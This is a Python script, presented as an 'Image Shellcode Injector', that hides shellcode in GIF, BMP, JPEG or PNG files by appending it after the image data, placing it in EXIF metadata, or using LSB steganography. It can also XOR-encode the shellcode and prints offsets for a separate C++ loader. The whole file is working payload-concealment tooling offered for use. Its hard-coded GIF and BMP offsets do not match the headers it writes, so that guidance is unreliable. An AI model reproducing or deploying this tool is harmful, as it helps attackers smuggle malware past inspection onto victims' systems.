#!/usr/bin/env python3

import os
import sys
import string
import random
import base64
import hashlib
from argparse import ArgumentParser
from itertools import cycle
from PIL import Image
import piexif

__version__ = '2.0'


# == Helper Functions == #

def xor_crypt(data, key):
    return bytes([d ^ k for d, k in zip(data, cycle(key))])

def prompt(question):
    reply = str(input(question + ' [Y/n]: ') or "Y").lower().strip()
    return reply in ['y', 'yes', '']

def hexdump(src, length=16, sep='.'):
    FILTER = ''.join([(len(repr(chr(x))) == 3) and chr(x) or sep for x in range(256)])
    lines  = []
    for c in range(0, len(src), length):
        chars = src[c:c+length]
        hexstr = ' '.join(['{:02x}'.format(x) for x in chars])
        printable = ''.join([(x <= 127 and FILTER[x]) or sep for x in chars])
        lines.append("%08x:  %-*s  |%s|" % (c, length*3, hexstr, printable))
    return '\n'.join(lines)


# == Image Headers == #

def gif_header_data():
    header  = b'\x47\x49\x46\x38\x39\x61'  # GIF89a
    header += b'\x0a\x00\x0a\x00'          # Width/Height: 10x10
    header += b'\x00\xff\x00'              # GCTF + BG Color + Pixel Aspect
    header += b'\x2c\x00\x00\x00\x00\x0a\x00\x0a\x00\x00'
    header += b'\x02\x00\x3b'              # Image block and terminator
    return header

def bmp_header_data():
    header  = b'\x42\x4d\x1e\x00\x00\x00\x00\x00\x00\x00\x1a\x00\x00\x00'
    header += b'\x0c\x00\x00\x00\x01\x00\x01\x00\x01\x00\x18\x00\x00\x00\xff\x00'
    return header


# == Injection Methods == #

def inject_eof(payload, contents, out_file):
    with open(out_file, "w+b") as f:
        f.write(contents)
        f.write(b'\x2f\x2f\x2f\x2f\x2f')
        f.write(payload)
        f.write(b'\x3b')
    print("[+]\tPayload injected using EOF method")

def inject_exif(payload, input_img, output_img):
    payload_b64 = base64.b64encode(payload)
    exif_dict = {"Exif": {piexif.ExifIFD.UserComment: b"ASCII\x00\x00\x00" + payload_b64}}
    exif_bytes = piexif.dump(exif_dict)
    img = Image.open(input_img)
    img.save(output_img, exif=exif_bytes)
    print("[+]\tPayload injected into EXIF metadata")

def inject_lsb(payload, input_img, output_img):
    img = Image.open(input_img)
    if img.mode != 'RGB':
        img = img.convert('RGB')
    pixels = list(img.getdata())

    bits = ''.join(format(byte, '08b') for byte in payload)
    required_pixels = (len(bits) + 2) // 3
    if required_pixels > len(pixels):
        print("[-] Image too small for LSB injection.")
        return

    new_pixels = []
    idx = 0
    for r, g, b in pixels:
        if idx >= len(bits):
            new_pixels.append((r, g, b))
            continue
        r = (r & ~1) | int(bits[idx]) if idx < len(bits) else r; idx += 1
        g = (g & ~1) | int(bits[idx]) if idx < len(bits) else g; idx += 1
        b = (b & ~1) | int(bits[idx]) if idx < len(bits) else b; idx += 1
        new_pixels.append((r, g, b))
    img.putdata(new_pixels)
    img.save(output_img)
    print("[+]\tPayload injected using LSB method")


# == Main == #

if __name__ == '__main__':
    parser = ArgumentParser(description='Image Shellcode Injector - v%s' % __version__)
    
    # Types of injection
    parser.add_argument('--gif', action='store_true', help='Use minimal GIF image (EOF injection)')
    parser.add_argument('--bmp', action='store_true', help='Use minimal BMP image (EOF injection)')
    parser.add_argument('--eof', action='store_true', help='Inject shellcode at EOF in existing image')
    parser.add_argument('--exif', action='store_true', help='Inject shellcode into EXIF UserComment')
    parser.add_argument('--lsb', action='store_true', help='Inject shellcode using LSB steganography')

    # Payload source
    parser.add_argument('-s', '--shellcode', type=str, help='Shellcode string')
    parser.add_argument('-f', '--file', type=str, help='File containing shellcode')

    # Encoding
    parser.add_argument('--encode', action='store_true', help='XOR encode the shellcode')
    parser.add_argument('-k', '--key', type=str, help='XOR key to use')

    parser.add_argument('-i', '--input', help='Input image file (for exif/lsb/eof)')
    parser.add_argument('-o', '--output', default='payload', help='Output image file name')
    parser.add_argument('--debug', action='store_true', help='Debug output')
    args = parser.parse_args()

    print(f"\n*** Image Shellcode Injector v{__version__} ***\n")

    # Load shellcode
    if args.file:
        if not os.path.exists(args.file):
            print(f"[!] File not found: {args.file}")
            sys.exit(1)
        shellcode = open(args.file, 'rb').read()
    elif args.shellcode:
        shellcode = args.shellcode.encode()
    else:
        print("[!] You must provide shellcode via --shellcode or --file")
        sys.exit(1)

    print(f"[>] Shellcode length: {len(shellcode)} bytes")
    print(f"[>] SHA256: {hashlib.sha256(shellcode).hexdigest()}")

    # XOR encoding
    if args.encode:
        key = args.key.encode() if args.key else bytes(''.join(random.choices(string.ascii_uppercase, k=16)), 'utf-8')
        print(f"[>] Using XOR key: {key.decode(errors='ignore')}")
        shellcode = xor_crypt(shellcode, key)
        with open('image.key', 'wb') as kf:
            kf.write(base64.b64encode(key))

    # Select injection method
    output = args.output
    if args.gif:
        output += '.gif'
        inject_eof(shellcode, gif_header_data(), output)

    elif args.bmp:
        output += '.bmp'
        inject_eof(shellcode, bmp_header_data(), output)

    elif args.eof:
        if not args.input or not os.path.exists(args.input):
            print("[!] Input image required for EOF injection")
            sys.exit(1)
        contents = open(args.input, 'rb').read()
        output += os.path.splitext(args.input)[-1]
        inject_eof(shellcode, contents, output)

    elif args.exif:
        if not args.input or not os.path.exists(args.input):
            print("[!] Input JPEG required for EXIF injection")
            sys.exit(1)
        output += '.jpg'
        inject_exif(shellcode, args.input, output)

    elif args.lsb:
        if not args.input or not os.path.exists(args.input):
            print("[!] Input image required for LSB injection")
            sys.exit(1)
        output += '.png'
        inject_lsb(shellcode, args.input, output)

    else:
        print("[!] You must select one injection method (--gif, --bmp, --eof, --exif, --lsb)")
        sys.exit(1)

    # Debug info
    if args.debug:
        with open(output, 'rb') as f:
            content = f.read()
        print(f"\n[*] Dump of injected image:\n{hexdump(content[:256])}")

    print("\n[=== Injection Summary ===]")
    technique = (
        'GIF' if args.gif else
        'BMP' if args.bmp else
        'EOF' if args.eof else
        'EXIF' if args.exif else
        'LSB'
    )
    print(f"[+] Technique: {technique}")
    print(f"[+] Output File: {output}")
    print(f"[+] Shellcode Size: {len(shellcode)} bytes")

    if args.encode:
        print(f"[+] XOR key (base64): {base64.b64encode(key).decode()}")
        print("[+] XOR key saved to: image.key")

    if args.gif:
        offset = 31 + 5  # GIF header + marker
        print(f"[>] Use this offset in your C++ loader:")
        print(f"    const size_t shellcodeStart = {offset};")

    elif args.bmp:
        offset = 35 + 5  # BMP header + marker
        print(f"[>] Use this offset in your C++ loader:")
        print(f"    const size_t shellcodeStart = {offset};")

    elif args.eof:
        with open(output, 'rb') as f:
            data = f.read()
        marker = b'\x2f\x2f\x2f\x2f\x2f'
        idx = data.find(marker)
        if idx != -1:
            print(f"[>] Marker '/////' found at offset: {idx}")
            print("[>] Use this offset in your C++ loader:")
            print(f"    const size_t shellcodeStart = {idx + 5};")
        else:
            print("[-] Marker not found, check the image.")

    elif args.exif:
        print("[>] EXIF Injection detected.")
        print("[!] This technique requires EXIF parsing in C++ or external extraction.")
        print("[>] Read the 'UserComment' field, then base64-decode and XOR-decode if needed.")

    elif args.lsb:
        est_pixels = (len(shellcode) * 8 + 2) // 3
        print("[>] LSB Injection detected.")
        print("[!] Use a pixel decoder to extract 3 LSBs per pixel and reassemble the shellcode.")
        print(f"[+] Estimated pixel range: 0 to {est_pixels}")
